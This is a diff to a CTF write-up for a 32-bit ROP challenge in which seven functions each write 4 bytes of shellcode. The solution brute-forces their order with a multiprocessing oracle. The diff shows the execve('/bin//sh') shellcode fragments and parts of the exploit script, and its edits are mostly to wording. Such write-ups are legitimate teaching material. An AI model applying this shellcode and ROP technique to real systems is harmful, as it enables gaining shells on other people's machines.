@@ -5,7 +5,7 @@
 
 ## Overview
 
-The rop program we are presented with is quite simple. It runs the welcome function, then the tryme function.
+The rop program we are presented with is quite simple. main runs the welcome function, then the tryme function.
 
 The welcome function mmaps a page with read write into a global variable called shellcode. 
 
@@ -16,32 +16,39 @@ no problem getting pointer control.
 
 ![alt text](./tryme.png)
 
-There is a function called win that will mprotect the shellcode page as executable then jmp into it. Cleary this is
-the final step once we have initalized out shellcode properly.
+There is also function called win that will mprotect the shellcode page as executable then jmp into it. Cleary 
+this is the final step once we have initalized our shellcode properly.
 
 ![alt text](./win.png)
 
-Only having two dwords for a rop chain is not a lot to work with. We can always use our first dword for one gadget or function, then
-our second for the address of the tryme function. This will allow us to call as many arbitrary functions as we need.
+Only having two dwords for a rop chain is not a lot to work with. The trick in this case is that we can use our 
+first dword on in our chain to rop to a function we want to call. The second dword in the chain will then be the 
+address of the tryme function again. We want to rop back to the tryme function, because we can then set up a new 
+chain over and over again. This will allow us to call as many arbitrary functions as we need.
 
-Upon futher inspection of the binary we can see some particular functions like this:
+Upon futher inspection of the binary we can see some peculiar functions like this:
 
 ![alt text](./loot_lake.png)
 
-This function loot_lake writes 4 specific bytes to the shellcode incrementing a global variable called len. 
-There are seven total functions like this. Each writes a different set of 4 bytes to the shellcode
-Now we can see the full picture. Some specific order of these sequences of 4 bytes will form valid shellcode
-that we can then use to get shell. The question now is which sequence will give us shell?
+This function loot_lake writes 4 specific bytes to the shellcode page incrementing a global variable called len. 
+There are seven total functions like this. Each writes a different sequence of 4 bytes to the shellcode
+Hopefully the challenge is clear now. We will need to find some specific order of these sequences of 4 bytes 
+that form valid shellcode then use the win function to jmp into it. The question now is which sequence will 
+give us shell?
 
 
 ## Solution
 
 My solution was brute forcing all permutations of the 7 byte sequences until I got a shell. I assumed that the solution would
 be a permutation of the 7, so the number of unique shellcodes we will need to test will be 7! = 5040. Because this is a lot of
-programs to test, we'll want to do some cleaver multithreaded things to make things move along faster.
+inputs to test, we'll want to do some cleaver multithreaded things to make things move along faster.
 
-Our first step should be writing an oracle function. This function should take a sequence of function addresses, and return a
-value that will indicate whether or not it was successful in getting shell. 
+<a href="https://imgflip.com/i/3wdxff"><img src="https://i.imgflip.com/3wdxff.jpg" title="made at imgflip.com"/></a>
+
+The first step for brute forcing any ctf challenge should be creating an oracle function. If you are not familiar, an oracle function
+is should be a very simple function that takes some guess and return some value insicating if that guess was correct. In our case here,
+we are going to be guessing the order of the rop chain, so our input should be a list of addresses. The basic idea of the oracle I have 
+here is that only if the program doesn't crash or send EOF, then we have found a valid combination.
 
 ```python
 def oracle(chain, local=True, stay=False):
@@ -96,7 +103,6 @@ this challenge just to read the writeup were just getting the buffering messed u
 Next step is to pull out the byte sequeces of all the 7 functions that alter the shellcode. I pulled them out by hand:
 
 ```python
-
 loot = '\xc0\x40\xcd\x80'
 lonely = '\xc1\x89\xc2\xb0'
 tilted = '\x31\xc0\x50\x68'
@@ -106,7 +112,7 @@ junk = '\x2f\x2f\x73\x68'
 grove = '\x6e\x89\xe3\x89'
 ```
 
-It will also be nice to have a map of the byte sequence to the address of the corresponding function:
+It will also be nice to have a map of the byte sequences to the address of the corresponding function:
 
 ```python
 e = ELF('./rop')
@@ -125,14 +131,13 @@ m = {
 ```
 
 We now have everything we need to start brute forcing the shellcode sequences. I decided to use 
-itertools.permutations to get the permutations of the byte sequences. From there I used pythons
+itertools.permutations to get the permutations of the byte sequences. From there I used python's
 multiprocessing library to make a worker Pool. Making this multiprocessing is essential for having
 this brute force approach be viable. If this was single threaded, assuming that each guess of the 5040
 different sequences takes 1.5 seconds to test, then the runtime would be `5040 * 1.5 = 7560 seconds = 126 minutes`.
 On my machine this script runs in 7 seconds. Yay multithreading! 
 
 With all the pieces, we can put together a full script:
-
 
 ```python
 #!/usr/bin/python2
@@ -232,7 +237,7 @@ def oracle(chain, local=True, stay=False):
     return r
 
 
-def doit(com):
+def dothething(com):
     """
     Take a permutation of the shellcode fragments and transform
     them into a chain of addresses. We'll then test the chain
@@ -254,7 +259,7 @@ we'll need to be careful to only pass back and forth simple objects
 to and from the workers.
 """
 pool = multiprocessing.Pool(500) # you may want to lower this on your machine
-chains = pool.map(doit, itertools.permutations(c))
+chains = pool.map(dothething, itertools.permutations(c))
 pool.close()
 
 """
@@ -269,3 +274,5 @@ local=0
 for i in chains:
     oracle(i, False, True)
 ```
+
+Now go wash your damn hands.
